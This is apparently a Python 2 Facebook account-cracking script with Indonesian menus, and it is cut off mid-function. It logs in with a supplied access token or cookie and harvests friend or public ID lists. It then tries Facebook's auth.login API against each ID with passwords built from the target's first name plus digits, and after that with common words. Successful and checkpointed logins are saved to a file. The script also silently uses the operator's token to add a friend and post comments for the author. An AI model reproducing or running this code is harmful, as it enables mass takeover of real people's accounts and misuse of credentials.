#!/usr/bin/python2
# coding=utf-8
import os,sys,time,mechanize,itertools,datetime,random,hashlib,re,threading,json,getpass,urllib,cookielib
from multiprocessing.pool import ThreadPool

#### WARNA RANDOM ####
P  = '\033[1;97m'  # putih
M  = '\033[1;91m' # merah
H  = '\033[1;92m' # hijau
K = '\033[1;93m' # kuning
B  = '\033[1;94m' # biru
U  = '\033[1;95m' # Ungu
O = '\033[1;96m' # biru muda

my_color = [P, M, H, K, B, U, O]
warna = random.choice(my_color)
warni = random.choice(my_color)

try:
	import mechanize
except ImportError:
	os.system("pip2 install mechanize")
try:
	import requests
except ImportError:
	os.system("pip2 install requests")
from requests.exceptions import ConnectionError
from mechanize import Browser
from datetime import datetime

reload(sys)
sys.setdefaultencoding('utf8')
br = mechanize.Browser()
br.set_handle_robots(False)
br.set_handle_refresh(mechanize._http.HTTPRefreshProcessor(),max_time=1)
br.addheaders = [('User-Agent', 'Opera/9.80 (Android; Opera Mini/32.0.2254/85. U; id) Presto/2.12.423 Version/12.16')]

os.system("clear")
done = False
def animate():
    for c in itertools.cycle(['\033[1;91m+', '\033[1;92m+', '\033[1;93m+', '\033[1;94m+', '\033[1;95m+', '\033[1;96m+']):
        if done:
            break
        sys.stdout.write('\r\033[1;91mTunggu \033[1;97mSebentar ' + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c + c )
        sys.stdout.flush()
        time.sleep(0.1)
 
t = threading.Thread(target=animate)
t.start()
 
time.sleep(5)
done = True

def keluar():
	print "\033[1;91m{\033[1;97m!\033[1;91m} \033[1;97mBerhasil Keluar !"
	os.sys.exit()
	
	
def acak(x):
    w = 'mhkbpcP'
    d = ''
    for i in x:
        d += '!'+w[random.randint(0,len(w)-1)]+i
    return cetak(d)
    
    
def cetak(x):
    w = 'mhkbpcP'
    for i in w:
        j = w.index(i)
        x= x.replace('!%s'%i,'%s;'%str(31+j))
    x += ''
    x = x.replace('!0','')
    sys.stdout.write(x+'\n')


def jalan(z):
	for e in z + '\n':
		sys.stdout.write(e)
		sys.stdout.flush()
		time.sleep(0.03)
		
#########LOGO#########
logo = """ 
\033[1;97m ◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆
\033[1;91m ✥ ╭━━━┳━━━┳━━━┳━━━┳╮╭━┳━━━╮ ✤ \033[1;96m╭━━━┳━━━┳━━━╮ ✥
\033[1;92m ✥ ┃╭━╮┃╭━╮┃╭━╮┃╭━╮┃┃┃╭┫╭━╮┃ ✤ \033[1;95m┃╭━╮┃╭━╮┃╭━╮┃ ✥
\033[1;93m ✥ ┃┃╱╰┫╰━╯┃┃╱┃┃┃╱╰┫╰╯╯┃╰━━╮ ✤\033[1;94m ┃╰━╯┃╰━╯┃┃╱┃┃ ✥
\033[1;94m ✥ ┃┃╱╭┫╭╮╭┫╰━╯┃┃╱╭┫╭╮┃╰━━╮┃ ✤ \033[1;93m┃╭━━┫╭╮╭┫┃╱┃┃ ✥
\033[1;95m ✥ ┃╰━╯┃┃┃╰┫╭━╮┃╰━╯┃┃┃╰┫╰━╯┃ ✤ \033[1;92m┃┃╱╱┃┃┃╰┫╰━╯┃ ✥
\033[1;96m ✥ ╰━━━┻╯╰━┻╯╱╰┻━━━┻╯╰━┻━━━╯ ✤ \033[1;91m╰╯╱╱╰╯╰━┻━━━╯ ✥
\033[1;97m ◆━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━◆
\033[1;97mＤ\033[1;96mＩ\033[1;95mＭ\033[1;94mＡ\033[1;93mＳ\033[1;92mＭ\033[1;91mＰ\033[1;90mＰ\033[1;90m１９０\033[1;90mＷ\033[1;91mＡ\033[1;92mＳ\033[1;93mＨ\033[1;94mＥ\033[1;95mＲ\033[1;96mＥ\033[1;97m！
\033[1;96m==================================================
\033[1;95m[\033[1;96m•\033[1;95m] \033[1;91mInstagram \033[1;95m➠ \033[1;97m@dimasmpp_
\033[1;95m[\033[1;96m•\033[1;95m] \033[1;91mYoutube \033[1;95m➠ \033[1;97mDimas Mpp
\033[1;95m[\033[1;96m•\033[1;95m] \033[1;91mFacebook \033[1;95m➠ \033[1;97mDIMAS M PRATAMA PURANTO
\033[1;96m=================================================="""

back = 0
threads = []
berhasil = []
cekpoint = []
oks = []
oke = []
id = []

###### MASUK ######
def masuk():
	os.system('clear')
	print logo
	print 50* "\033[1;94m═"
	print "\033[1;93m[\033[1;92m01\033[1;93m] Login Via Token Facebook"
	print "\033[1;93m[\033[1;92m02\033[1;93m] Ambil Token Download Token App"
	print "\033[1;93m[\033[1;92m03\033[1;93m] Ambil Token Dari Link"
	print "\033[1;93m[\033[1;92m04\033[1;93m] Login Via Cookie Facebook"
	print "\033[1;97m[\033[1;91m00\033[1;97m] \033[1;91mKeluar"
	print 50* "\033[1;94m═"
	pilih_masuk()

def pilih_masuk():
	msuk = raw_input("\033[1;91mPilih Nomer \033[91m:\033[1;97m ")
	if msuk =="":
		print"\033[1;91m[\033[1;97m!\033[1;91m] Isi Dengan Benar Coyy !!"
		pilih_masuk()
	elif msuk =="1" or msuk =="01":
		tokenz()
	elif msuk =="2"or msuk =="02":
		ambil_token()
	elif msuk =="3"or msuk =="03":
		ambil_link()
	elif msuk =="4"or msuk =="04":
		cookie()
	elif msuk =="0" or msuk =="00":
		keluar()
	else:
		print"\033[1;91m[\033[1;97m!\033[1;91m] Isi Dengan Benar Pak !!"
		pilih_masuk()
		
#####LOGIN_COOKIE#####
def cookie():
    try:
          cek = open("cookies").read()
    except FileNotFoundError:
          cek = input("\033[00mCookies : \033[1;95m")
    cek = {"cookie":cek}
    ismi = ses.get(mbasic.format("/me",verify=False),cookies=cek).content
    if "mbasic_logout_button" in str(ismi):
        if "Hallo Gan Selamat Datang" in str(ismi):
            with open("cookies","w") as f:
                 f.write(cek["cookie"])
        else:
            try:
                 requests.get(mbasic.format(parser(ismi,"html.parser").find("a",string="Bahasa Indonesia")["href"]),cookies=cek)
            except:
                 pass
        try:
             ikuti = parser(requests.get(mbasic.format("/xzcoder.xzcoder"),cookies=cek).content,"html.parser").find("a",string="Ikuti")["href"]
             ses.get(mbasic.format(ikuti),cookies=cek)
        except:
             pass
        return cek["cookie"]
    else:
        print('\033[00mCookies \033[91mInvalid\033[00m')
        time.sleep(1)
        os.system('python fb.py')
			
#####LOGIN_TOKENZ#####
def tokenz():
	os.system('clear')
	print logo
	print 50* "\033[1;92m═"
	toket = raw_input("\033[1;94m[\033[1;96m?\033[1;94m] Token \033[1;97m:\033[1;93m ")
	print 50* "\033[1;92m═"
	try:
		otw = requests.get('https://graph.facebook.com/me?access_token='+toket)
		a = json.loads(otw.text)
		zedd = open("login.txt", 'w')
		zedd.write(toket)
		zedd.close()
		print '\033[1;97m[\033[1;94m√\033[1;97m]\033[1;90m Login Berhasil ! '
		jalan ('\033[1;91mJANGAN LUPA SUBSCRIBE CHANNEL YOUTUBE DIMAS MPP')
		jalan ('\033[1;95mMAKASIH YANG UDAH SUBSCRIBE CHANNEL DIMAS MPP')
		os.system('xdg-open https://www.youtube.com/c/DIMASMPP')
		bot_komen()
	except KeyError:
		print "\033[1;97m<\033[1;91m!\033[1;97m> \033[1;91mToken salah Boss !!"
		time.sleep(1.7)
		masuk()

######AMBIL_TOKEN######
def ambil_token():
	os.system ("clear")
	print logo
	print 50* "\033[1;93m-"
	jalan("\033[1;91mKamu \033[1;92mAkan \033[1;93mDi \033[1;94mArahkan \033[1;95mKe \033[1;96mBrowser")
	jalan("\033[1;91mMohon \033[1;91mTunggu \033[1;97mSebentar...")
	print 50* "\033[1;92m-"
	os.system('xdg-open https://sfile.mobi/aCBevtiWGs8')
	time.sleep(2)
	masuk()
	
##### AMBIL LINK #####
def ambil_link():
	os.system("clear")
	print logo
	print 50* "\033[1;92m-"
	jalan("\033[1;91mDilarang Menggunakan Akun Facebook Lama")
	jalan("\033[1;95mWajib Menggunakan Akun Facebook Baru")
	jalan("\033[1;94mJika Ingin Menggunakan Akun Facebook Lama")
	jalan("\033[1;93mWajib Menggunakan Aplikasi Yg Di Sediakan")
	print 50* "\033[1;92m-"
	os.system ("cd ... && npm install")
	jalan ("\033[1;96mMulai...")
	os.system ("cd ... && npm start")
	raw_input("\n{Kembali}")
	masuk()
	
###### BOT KOMEN #######
def bot_komen():
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;97m[!] Token invalid"
		os.system('rm -rf login.txt')
	una = ('100047165779215')
	kom = ('Mantap Bang 😘')
	reac = ('LOVE')
	post = ('213235416925316')
	post2 = ('209016597347198')
	kom2 = ('Izin Pake Sc Lu Ya Bang 😁')
	reac2 = ('ANGRY')
	requests.post('https://graph.facebook.com/me/friends?method=post&uids=' +una+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/comments/?message=' +kom+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post+'/reactions?type=' +reac+ '&access_token='+ toket)
	requests.post('https://graph.facebook.com/'+post2+'/comments/?message=' +kom2+ '&access_token=' + toket)
	requests.post('https://graph.facebook.com/'+post2+'/reactions?type=' +reac2+ '&access_token='+ toket)
	menu()

###### MENU #######
def menu():
	os.system('clear')
	try:
		toket = open('login.txt','r').read()
	except IOError:
		print "[!] Token Facebook Salah !!"
		os.system('clear')
		os.system('rm -rf login.txt')
		masuk()
	try:
		otw = requests.get('https://graph.facebook.com/me/?access_token='+toket)
		a = json.loads(otw.text)
		nama = a['name']
		id = a['id']
	except KeyError:
		os.system('clear')
		print"\033[1;91m[!] \033[1;96mToken Facebook Salah !!"
		os.system('rm -rf login.txt')
		time.sleep(1)
		masuk()
		time.sleep(1)
		masuk()
	except requests.exceptions.ConnectionError:
		print"[!] Tidak Ada Koneksi Internet !!"
		keluar()
	os.system("clear")
	print logo
	print 50* "\033[1;94m═"
	print "\033[1;96m[\033[1;95m×\033[1;96m]\033[1;95m NAMA\033[1;97m    ➣\033[1;91m " +nama
	print "\033[1;96m[\033[1;95m×\033[1;96m]\033[1;95m USER ID\033[1;97m ➢\033[1;91m " + id
	print 50* "\033[1;93m═"
	print "\033[1;91m["+warna+"01\033[1;91m]\033[1;96m Crack ID Dari Teman/Publik"
	print "\033[1;91m["+warna+"02\033[1;91m]\033[1;96m Crack ID Dari Postingan Grup/Teman"
	print "\033[1;91m["+warna+"03\033[1;91m]\033[1;96m Crack ID Dari Total Followers"
	print "\033[1;91m["+warna+"04\033[1;91m]\033[1;96m Cari ID Menggunakan Username"
	print "\033[1;91m["+warna+"05\033[1;91m]\033[1;96m Perbarui Script"
	print "\033[1;97m[\033[1;91m00\033[1;97m] \033[1;91mKeluar"
	print 50* "\033[1;92m═"
	pilih()
	
######PILIH######
def pilih():
	unikers = raw_input("\033[1;94mPilih Nomer \033[93m?\033[1;92m ")
	if unikers =="":
		print"\033[1;91m[\033[1;97m!\033[1;91m]\033[1;92m Isi Dengan Benar :)"
		pilih()
	elif unikers =="1" or unikers =="01":
		crack_teman()
	elif unikers =="2" or unikers =="02":
		crack_likes()
	elif unikers =="3" or unikers =="03":
		crack_follow()
	elif unikers =="4" or unikers =="04":
		user_id()
	elif unikers =="5" or unikers =="05":
		perbarui()
	elif unikers =="0" or unikers =="00":
		os.system('clear')
		jalan('Menghapus Token Facebook')
		os.system('rm -rf login.txt')
		keluar()
	else:
		print"\033[1;95m[\033[1;90m!\033[1;95m]\033[1;93m Isi Dengan Benar :)"
		pilih()
		
##### CRACK TEMAN/PUBLIK #####
def crack_teman():
	os.system("clear")
	print logo
	print 50* "\033[1;97m═"
	print "\033[1;93m[\033[1;94m01\033[1;93m]\033[1;90m Crack ID \033[1;91mIndo\033[1;97mnesia"
	print "\033[1;93m[\033[1;94m02\033[1;93m]\033[1;90m Crack ID \033[1;92mBangla\033[1;91mdesh"
	print "\033[1;93m[\033[1;94m03\033[1;93m]\033[1;90m Crack ID \033[1;94mU\033[1;91ms\033[1;97ma"
	print "\033[1;93m[\033[1;94m04\033[1;93m]\033[1;90m Crack ID \033[1;92mPaki\033[1;97mstan"
	print "\033[1;97m[\033[1;91m00\033[1;97m]\033[1;91m Kembali"
	print 50* "\033[1;97m═"
	pilih_teman()
	
######PILIH######
def pilih_teman():
	univ = raw_input("\033[1;96mPilih Nomer \033[97m?\033[1;95m ")
	if univ =="":
		print"\033[1;91m{\033[1;97m!\033[1;91m}\033[1;95m Isi Dengan Benar :)"
		pilih_teman()
	elif univ =="1" or univ =="01":
		crack_indo()
	elif univ =="2" or univ =="02":
		crack_bangla()
	elif univ =="3" or univ =="03":
		crack_usa()
	elif univ =="4" or univ =="04":
		crack_pakis()
	elif univ =="5" or univ =="05":
		univ()
	elif univ =="0" or univ =="00":
		menu()
	else:
		print"\033[1;91m[\033[1;97m!\033[1;91m]\033[1;96m Isi Dengan Benar :)"
		pilih_teman()
		
##### CRACK INDONESIA #####
def crack_indo():
	global toket
	os.system('clear')
	try:
		toket=open('login.txt','r').read()
	except IOError:
		print"\033[1;91m[!] \x1b[1;97mToken Facebook Salah !!"
		os.system('rm -rf login.txt')
		time.sleep(1)
		keluar()
	os.system('clear')
	print logo
	print 50* "\033[1;91m═"
	print "\033[1;91m[\033[1;97m01\033[1;91m] \033[1;90mCrack Dari Daftar Teman"
	print "\033[1;91m[\033[1;97m02\033[1;91m] \033[1;90mCrack Dari Publik/Teman"
	print "\033[1;91m[\033[1;97m03\033[1;91m] \033[1;90mCrack Dari File"
	print "\033[1;97m[\033[1;91m00\033[1;97m] \033[1;91mKembali"
	print 50* "\033[1;97m═"
	pilih_indo()

#### PILIH INDONESIA ####
def pilih_indo():
	teak = raw_input("\033[1;91mPilih Nomer \033[91m?\033[1;97m ")
	if teak =="":
		print"\033[1;91m{\033[1;97m!\033[1;91m}\033[1;95m Isi Dengan Benar :)"
		pilih_indo()
	elif teak =="1" or teak =="01":
		os.system('clear')
		print logo
		print 50* "\033[1;91m═"
		print ("             \033[1;91m°°° \033[1;97mCRACK INDONESIA \033[1;91m°°°")
		print 50* "\033[1;97m═"
		r = requests.get("https://graph.facebook.com/me/friends?access_token="+toket)
		z = json.loads(r.text)
		for s in z['data']:
			id.append(s['id'])
	elif teak =="2" or teak =="02":
		os.system('clear')
		print logo
		print 50* "\033[1;91m═"
		print ("             \033[1;91m°°° \033[1;97mCRACK INDONESIA \033[1;91m°°°")
		print 50* "\033[1;97m═"
		idt = raw_input("\033[1;91m[\033[1;97m+\033[1;91m] \033[1;90mID Publik/Teman \033[1;97m:\033[1;91m ")
		try:
			pok = requests.get("https://graph.facebook.com/"+idt+"?access_token="+toket)
			sp = json.loads(pok.text)
			print"\033[1;91m[\033[1;97m+\033[1;91m]\033[1;97m Nama \033[1;91m:\033[1;96m "+sp["name"]
		except KeyError:
			print"\033[1;97m<\033[1;91m!\033[1;97m> ID Publik/Teman Tidak Ada Boss !!"
			raw_input("\n\033[1;93m[\033[1;97m•Kembali•\033[1;93m]")
			crack_indo()
		except requests.exceptions.ConnectionError:
			print"\033[1;91m{\033[1;97m!\033[1;91m} Tidak Ada Koneksi Internet !"
			keluar()
		r = requests.get("https://graph.facebook.com/"+idt+"/friends?access_token="+toket)
		z = json.loads(r.text)
		for i in z['data']:
			id.append(i['id'])
	elif teak =="3" or teak =="03":
		os.system('clear')
		print logo
		try:
			print 50* "\033[1;91m═"
			print ("             \033[1;91m°°° \033[1;97mCRACK INDONESIA \033[1;91m°°°")
			print 50* "\033[1;97m═"
			idlist = raw_input('\033[1;91m[\033[1;97m+\033[1;91m] \033[1;97mNama File\033[1;91m :\033[1;97m ')
			for line in open(idlist,'r').readlines():
				id.append(line.strip())
		except KeyError:
			print '\033[1;91m{\033[1;97m!\033[1;91m} File Tidak Ada !! '
			raw_input('\n\033[1;91m[ \033[1;97m•Kembali• \033[1;91m]')
		except IOError:
			print '\033[1;91m{\033[1;97m!\033[1;91m} File tidak ada !'
			raw_input("\n\033[1;91m[\033[1;97m•Kembali•\033[1;91m]")
			crack_indo()
	elif teak =="0" or teak =="00":
		menu()
	else:
		print"\033[1;91m[\033[1;97m!\033[1;91m]\033[1;95m Isi Dengan Benar :)"
		pilih_indo()
	
	print "\033[1;91m[\033[1;97m+\033[1;91m] \033[1;97mTotal ID \033[1;91m:\033[1;94m "+str(len(id))
	print('\033[1;91m[\033[1;97m+\033[1;91m] \033[1;97mStop Tekan \033[1;92mCTRL+Z')
	titik = ['\033[1;96m. ','\033[1;95m.. ','\033[1;94m... ','\033[1;93m.... ','\033[1;92m..... ']
	for o in titik:
		print("\r\033[1;91m[\033[1;97m+\033[1;91m] \033[1;97mCrack \033[1;95mBerjalan "+o),;sys.stdout.flush();time.sleep(1)
	print("\n\033[1;91m[\033[1;97m+\033[1;91m] \033[1;97mGunakan \033[1;93mMode \033[1;96mPesawat \033[1;97mJika \033[1;97mTidak \033[1;97mAda \033[1;97mHasil !")
	print ("\033[1;91m══════════════════════════════════════════════════════════════════════")
	
##### MAIN INDONESIA #####
	def main(arg):
		global cekpoint,oks
		zowe = arg
		try:
			sys.stdout.write("\r{}".format(datetime.now().strftime("\033[1;96m%H\033[1;91m:\033[1;93m%M\033[1;91m:\033[1;92m%S \033[1;97m"+str(len(zowe)))));sys.stdout.flush()
			os.mkdir('done')
		except OSError:
			pass
		try:
			an = requests.get('https://graph.facebook.com/'+zowe+'/?access_token='+toket)
			j = json.loads(an.text)
			bos1 = j['first_name'].lower()+'123'
			data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos1)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
			ko = json.load(data)
			if 'access_token' in ko:
				print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
				print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos1
				oke = open("done/indo.txt", "a")
				oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
				oke.close()
				oks.append(zowe)
			else:
				if 'www.facebook.com' in ko['error_msg']:
					print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
					print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
					print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
					print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos1
					cek = open("done/indo.txt", "a")
					cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos1+"\n")
					cek.close()
					cekpoint.append(zowe)
				else:
					bos2 = j['first_name'].lower()+'1234'
					data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos2)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
					ko = json.load(data)
					if 'access_token' in ko:
						print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
						print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos2
						oke = open("done/indo.txt", "a")
						oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
						oke.close()
						oks.append(zowe)
					else:
						if 'www.facebook.com' in ko['error_msg']:
							print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
							print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
							print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
							print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos2
							cek = open("done/indo.txt", "a")
							cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos2+"\n")
							cek.close()
							cekpoint.append(zowe)
						else:
							bos3 = j['first_name'].lower()+'12345'
							data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos3)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
							ko = json.load(data)
							if 'access_token' in ko:
								print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
								print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos3
								oke = open("done/indo.txt", "a")
								oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
								oke.close()
								oks.append(zowe)
							else:
								if 'www.facebook.com' in ko['error_msg']:
									print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
									print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
									print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
									print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos3
									cek = open("done/indo.txt", "a")
									cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos3+"\n")
									cek.close()
									cekpoint.append(zowe)
								else:
									bos4 = ('sayang')
									data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos4)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
									ko = json.load(data)
									if 'access_token' in ko:
										print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
										print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos4
										oke = open("done/indo.txt", "a")
										oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
										oke.close()
										oks.append(zowe)
									else:
										if 'www.facebook.com' in ko['error_msg']:
											print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
											print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
											print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
											print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos4
											cek = open("done/indo.txt", "a")
											cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos4+"\n")
											cek.close()
											cekpoint.append(zowe)
										else:
											bos5 = ('bangsat')
											data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos5)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
											ko = json.load(data)
											if 'access_token' in ko:
												print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
												print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos5
												oke = open("done/indo.txt", "a")
												oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
												oke.close()
												oks.append(zowe)
											else:
												if 'www.facebook.com' in ko['error_msg']:
													print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
													print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
													print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
													print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos5
													cek = open("done/indo.txt", "a")
													cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos5+"\n")
													cek.close()
													cekpoint.append(zowe)
												else:
													bos6 = ('anjing')
													data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos6)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
													ko = json.load(data)
													if 'access_token' in ko:
														print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
														print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos6
														oke = open("done/indo.txt", "a")
														oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
														oke.close()
														oks.append(zowe)
													else:
														if 'www.facebook.com' in ko['error_msg']:
															print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
															print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;93m") + j['name']
															print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;93m") + zowe
															print ("\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;93m") + bos6
															cek = open("done/indo.txt", "a")
															cek.write("\n{×} CEKPOINT \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos6+"\n")
															cek.close()
															cekpoint.append(zowe)
														else:
															bos7 = ('kontol')
															data = urllib.urlopen("https://b-api.facebook.com/method/auth.login?access_token=237759909591655%25257C0f140aabedfb65ac27a739ed1a2263b1&format=json&sdk_version=2&email="+(zowe)+"&locale=en_US&password="+(bos7)+"&sdk=ios&generate_session_cookies=1&sig=3f555f99fb61fcd7aa0c44f58f522ef6")
															ko = json.load(data)
															if 'access_token' in ko:
																print ("\n\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} \x1b[1;92mBERHASIL")
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Nama  \x1b[1;91m    > \x1b[1;92m") + j['name']
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} User  \x1b[1;91m    > \x1b[1;92m") + zowe
																print ("\x1b[1;97m{\x1b[1;92m×\x1b[1;97m} Password  \x1b[1;91m> \x1b[1;92m") + bos7
																oke = open("done/indo.txt", "a")
																oke.write("\n{×} BERHASIL \n{×} Nama     > " +j['name']+ "\n{×} User     > " +zowe+ "\n{×} Password > " +bos7+"\n")
																oke.close()
																oks.append(zowe)
															else:
																if 'www.facebook.com' in ko['error_msg']:
																	print ("\n\x1b[1;97m{\x1b[1;93m×\x1b[1;97m} \x1b[1;93mCEKPOINT")
